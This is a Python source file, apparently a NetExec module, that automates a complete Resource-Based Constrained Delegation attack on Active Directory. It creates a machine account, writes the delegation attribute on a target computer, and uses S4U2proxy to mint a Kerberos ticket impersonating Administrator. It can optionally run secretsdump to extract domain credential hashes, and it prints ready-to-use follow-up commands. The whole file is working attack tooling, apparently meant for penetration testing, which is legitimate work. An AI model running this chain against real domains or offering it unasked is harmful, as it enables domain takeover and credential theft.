import os
import re
import shutil
import string
import secrets
import subprocess

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes


class NXCModule:
    """
    Full Resource-Based Constrained Delegation (RBCD) attack chain from a single nxc run.

    Pre-req: the LDAP principal you authenticate as can write the
    msDS-AllowedToActOnBehalfOfOtherIdentity attribute of TARGET (GenericAll /
    GenericWrite / WriteDacl / WriteProperty on the computer object).

    Chain:
      1. (optional) create a machine account          -> impacket-addcomputer
      2. write msDS-AllowedToActOnBehalfOfOtherIdentity -> impacket-rbcd  -action write
      3. S4U2self + S4U2proxy for IMPERSONATE          -> impacket-getST
      4. drop the KRB5CCNAME ccache and print the export line
      5. (optional) secretsdump -just-dc with that ticket
      6. (optional) clean up the delegation + computer

    Module by biontdv
    """

    name = "rbcd"
    description = "GenericAll->RBCD->S4U in one shot: writes msDS-AllowedToActOnBehalfOfOtherIdentity and mints a KRB5CCNAME ticket"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION
    opsec_safe = False
    multiple_hosts = False

    def options(self, context, module_options):
        r"""
        TARGET        Computer object to configure delegation ON (the delegation victim).
                      Accepts "DC01", "DC01$" or an FQDN. Default: the host nxc is talking to.
        ACTION        full (default) | read | write | flush
                        read  - just show the current msDS-AllowedToActOnBehalfOfOtherIdentity
                        write - create (if needed) + write the attribute, no ticket
                        full  - write + S4U2Proxy, produce the ccache
                        flush - clear the attribute
        FROM          sAMAccountName of an attacker-controlled account to delegate FROM.
                      If omitted on write/full a new machine account is created
                      (needs ms-DS-MachineAccountQuota > 0).
        FROM_PASS     Password for FROM (only when you bring your own account).
        FROM_HASH     LMHASH:NTHASH or :NTHASH for FROM (alternative to FROM_PASS).
        COMPUTER      Name for the machine account to create (default: random, e.g. NXC-ABC123$).
        COMPUTER_PASS Password for the created machine account (default: random 20 chars).
        IMPERSONATE   User to impersonate through S4U (default: Administrator).
        SPN           Service SPN to request (default: cifs/<TARGET dNSHostName>).
        OUTDIR        Directory to write the .ccache into (default: current working dir).
        FORWARDABLE   true -> pass -force-forwardable to getST (some hardened DCs need it).
        DUMP          true -> run secretsdump -just-dc with the resulting ticket.
        CLEANUP       true -> flush the RBCD attribute (and delete the created computer) at the end.
        METHOD        addcomputer method: SAMR (default) or LDAPS.
        """
        self.target = module_options.get("TARGET")
        self.action = module_options.get("ACTION", "full").lower()
        self.delegate_from = module_options.get("FROM")
        self.from_pass = module_options.get("FROM_PASS")
        self.from_hash = module_options.get("FROM_HASH")
        self.computer = module_options.get("COMPUTER")
        self.computer_pass = module_options.get("COMPUTER_PASS")
        self.impersonate = module_options.get("IMPERSONATE", "Administrator")
        self.spn = module_options.get("SPN")
        self.outdir = os.path.abspath(os.path.expanduser(module_options.get("OUTDIR", os.getcwd())))
        self.forwardable = self._truthy(module_options.get("FORWARDABLE"))
        self.dump = self._truthy(module_options.get("DUMP"))
        self.cleanup = self._truthy(module_options.get("CLEANUP"))
        self.method = module_options.get("METHOD", "SAMR").upper()

        self._created_computer = False

        if self.action not in ("full", "read", "write", "flush"):
            context.log.fail(f"Unknown ACTION '{self.action}' (use full|read|write|flush)")
            self.action = None

    @staticmethod
    def _truthy(v):
        return str(v).lower() in ("1", "true", "yes", "on") if v is not None else False

    @staticmethod
    def _rand(n, alphabet=string.ascii_uppercase + string.digits):
        return "".join(secrets.choice(alphabet) for _ in range(n))

    @staticmethod
    def _tool(name):
        for cand in (f"impacket-{name}", f"{name}.py", name):
            p = shutil.which(cand)
            if p:
                return p
        return f"impacket-{name}"

    def _attacker_auth(self, connection):
        """(identity, extra_argv, env) to run impacket CLIs as the current LDAP principal."""
        domain = connection.domain
        user = connection.username
        env = os.environ.copy()
        extra = []

        password = getattr(connection, "password", "") or ""
        nthash = getattr(connection, "nthash", "") or ""
        lmhash = getattr(connection, "lmhash", "") or ""
        aes = getattr(connection, "aesKey", "") or ""
        use_kcache = bool(getattr(connection.args, "use_kcache", False)) or bool(env.get("KRB5CCNAME") and not password and not nthash and not aes)

        identity = f"{domain}/{user}"
        if use_kcache:
            extra += ["-k", "-no-pass"]
        elif aes:
            extra += ["-aesKey", aes, "-k", "-no-pass"]
        elif nthash:
            lm = lmhash or "aad3b435b51404eeaad3b435b51404ee"
            extra += ["-hashes", f"{lm}:{nthash}"]
        elif password:
            identity = f"{domain}/{user}:{password}"
        else:
            h = getattr(connection, "hash", "") or ""
            if h:
                extra += ["-hashes", h if ":" in h else f"aad3b435b51404eeaad3b435b51404ee:{h}"]
        return identity, extra, env

    def _run(self, context, argv, env=None, cwd=None):
        context.log.debug("exec: " + " ".join(argv))
        try:
            p = subprocess.run(argv, env=env, cwd=cwd, capture_output=True, text=True, timeout=180)
        except subprocess.TimeoutExpired:
            context.log.fail("command timed out: " + " ".join(argv[:2]))
            return 1, ""
        out = (p.stdout or "") + (p.stderr or "")
        for line in out.splitlines():
            s = line.strip()
            if not s or s.startswith("Impacket v") or s.startswith("Copyright"):
                continue
            s = re.sub(r"^\[[*+\-!]\]\s*", "", s)
            context.log.display(f"  {s}")
        return p.returncode, out

    def on_login(self, context, connection):
        if not self.action:
            return

        domain = connection.domain
        self._dom = domain
        dc_ip = connection.host
        if not self.target:
            self.target = getattr(connection, "hostname", None) or ""
        if not self.target:
            context.log.fail("TARGET not given and could not be derived, pass TARGET=<computer>")
            return

        target_short = self.target.split(".")[0].rstrip("$")
        target_sam = f"{target_short}$"

        # resolve dNSHostName for a sane default SPN / secretsdump target
        target_fqdn = f"{target_short}.{domain}"
        try:
            res = connection.search(f"(sAMAccountName={target_sam})", ["dNSHostName", "distinguishedName"])
            parsed = parse_result_attributes(res) if res else []
            if parsed and parsed[0].get("dNSHostName"):
                target_fqdn = parsed[0]["dNSHostName"]
        except Exception as e:
            context.log.debug(f"dNSHostName lookup failed: {e}")

        if not self.spn:
            self.spn = f"cifs/{target_fqdn}"

        identity, auth_extra, env = self._attacker_auth(connection)
        rbcd_bin = self._tool("rbcd")

        context.log.display(f"target computer : {target_sam}  ({target_fqdn})")
        context.log.display(f"acting as       : {identity.split(':')[0]}")

        # ---- READ ----
        rc, _ = self._run(context, [rbcd_bin, identity, *auth_extra, "-dc-ip", dc_ip,
                                    "-delegate-to", target_sam, "-action", "read"], env=env)
        if self.action == "read":
            return

        # ---- FLUSH ----
        if self.action == "flush":
            self._run(context, [rbcd_bin, identity, *auth_extra, "-dc-ip", dc_ip,
                                "-delegate-to", target_sam, "-action", "flush"], env=env)
            return

        # ---- ensure we have an account to delegate FROM ----
        if not self.delegate_from:
            maq = None
            try:
                r = connection.search("(objectClass=domain)", ["ms-DS-MachineAccountQuota"])
                p = parse_result_attributes(r) if r else []
                if p and p[0].get("ms-DS-MachineAccountQuota") is not None:
                    maq = int(p[0]["ms-DS-MachineAccountQuota"])
            except Exception as e:
                context.log.debug(f"MAQ lookup failed: {e}")
            context.log.display(f"MachineAccountQuota: {maq if maq is not None else 'unknown'}")
            if maq is not None and maq <= 0:
                context.log.fail("MachineAccountQuota is 0, supply your own account with FROM=/FROM_PASS=")
                return

            self.computer = self.computer or f"NXC-{self._rand(6)}$"
            if not self.computer.endswith("$"):
                self.computer += "$"
            self.computer_pass = self.computer_pass or (self._rand(20, string.ascii_letters + string.digits) + "!aA1")
            add_bin = self._tool("addcomputer")
            argv = [add_bin, identity, *auth_extra, "-dc-ip", dc_ip,
                    "-computer-name", self.computer, "-computer-pass", self.computer_pass,
                    "-method", self.method]
            if self.method == "LDAPS":
                argv += ["-dc-host", target_fqdn if target_fqdn.split(".")[0].lower() == target_short.lower() else f"{connection.hostname}.{domain}"]
            context.log.display(f"creating machine account {self.computer}")
            rc, out = self._run(context, argv, env=env)
            if rc != 0 and "Successfully added" not in out:
                context.log.fail("machine account creation failed")
                return
            context.log.success(f"machine account {self.computer} : {self.computer_pass}")
            self.delegate_from = self.computer
            self.from_pass = self.computer_pass
            self.from_hash = None
            self._created_computer = True

        # ---- WRITE the delegation ----
        context.log.display(f"writing msDS-AllowedToActOnBehalfOfOtherIdentity: {self.delegate_from} -> {target_sam}")
        rc, out = self._run(context, [rbcd_bin, identity, *auth_extra, "-dc-ip", dc_ip,
                                      "-delegate-to", target_sam, "-delegate-from", self.delegate_from,
                                      "-action", "write"], env=env)
        if "successfully" not in out.lower() and "can already impersonate" not in out.lower():
            context.log.fail("RBCD write did not confirm success, aborting")
            return
        context.log.success("delegation rights in place")

        if self.action == "write":
            self._maybe_cleanup(context, identity, auth_extra, env, dc_ip, target_sam)
            return

        # ---- S4U2self / S4U2proxy ----
        os.makedirs(self.outdir, exist_ok=True)
        getst_bin = self._tool("getST")
        from_identity = f"{domain}/{self.delegate_from.rstrip('$')}$" if self.delegate_from.endswith("$") else f"{domain}/{self.delegate_from}"
        s4u_extra = []
        if self.from_hash:
            h = self.from_hash if ":" in self.from_hash else f"aad3b435b51404eeaad3b435b51404ee:{self.from_hash}"
            s4u_extra += ["-hashes", h]
        elif self.from_pass:
            from_identity = f"{from_identity}:{self.from_pass}"
        else:
            context.log.fail("no password/hash available for FROM account, cannot run S4U")
            return
        argv = [getst_bin, "-spn", self.spn, "-impersonate", self.impersonate, "-dc-ip", dc_ip]
        if self.forwardable:
            argv.append("-force-forwardable")
        argv += s4u_extra + [from_identity]

        context.log.display(f"S4U2Proxy: impersonating {self.impersonate} for {self.spn}")
        rc, out = self._run(context, argv, env=env, cwd=self.outdir)
        m = re.search(r"Saving ticket in (\S+\.ccache)", out)
        if not m:
            context.log.fail("getST did not produce a ccache")
            self._maybe_cleanup(context, identity, auth_extra, env, dc_ip, target_sam)
            return
        raw_ccache = os.path.join(self.outdir, os.path.basename(m.group(1)))
        stable = os.path.join(self.outdir, f"rbcd_{self.impersonate}_{target_short}.ccache".replace(" ", "_"))
        try:
            shutil.copyfile(raw_ccache, stable)
        except Exception:
            stable = raw_ccache

        context.log.success("Kerberos ticket obtained")
        context.log.highlight(f"export KRB5CCNAME={stable}")
        context.log.highlight(f"nxc smb {target_fqdn} --use-kcache")
        context.log.highlight(f"impacket-secretsdump -k -no-pass -just-dc -dc-ip {dc_ip} {target_fqdn}")

        # ---- optional dump ----
        if self.dump:
            denv = env.copy()
            denv["KRB5CCNAME"] = stable
            context.log.display("running secretsdump -just-dc")
            self._run(context, [self._tool("secretsdump"), "-k", "-no-pass", "-just-dc",
                                "-dc-ip", dc_ip, target_fqdn], env=denv, cwd=self.outdir)

        self._maybe_cleanup(context, identity, auth_extra, env, dc_ip, target_sam)

    def _maybe_cleanup(self, context, identity, auth_extra, env, dc_ip, target_sam):
        if not self.cleanup:
            if self._created_computer:
                context.log.display(f"note: machine account {self.computer} and the RBCD ACE are still present (CLEANUP=true to remove)")
            return
        context.log.display("cleanup: flushing RBCD attribute")
        self._run(context, [self._tool("rbcd"), identity, *auth_extra, "-dc-ip", dc_ip,
                            "-delegate-to", target_sam, "-action", "flush"], env=env)
        if self._created_computer:
            context.log.display(f"cleanup: deleting machine account {self.computer}")
            rc, out = self._run(context, [self._tool("addcomputer"), identity, *auth_extra, "-dc-ip", dc_ip,
                                          "-computer-name", self.computer, "-delete"], env=env)
            if "Successfully deleted" not in out:
                context.log.display(f"leftover: {self.computer} could not be removed with the current rights")
                context.log.display(f"          remove it once you have DA:  impacket-addcomputer '{self._dom}/Administrator' -hashes :<NTHASH> -dc-ip {dc_ip} -computer-name '{self.computer}' -delete")
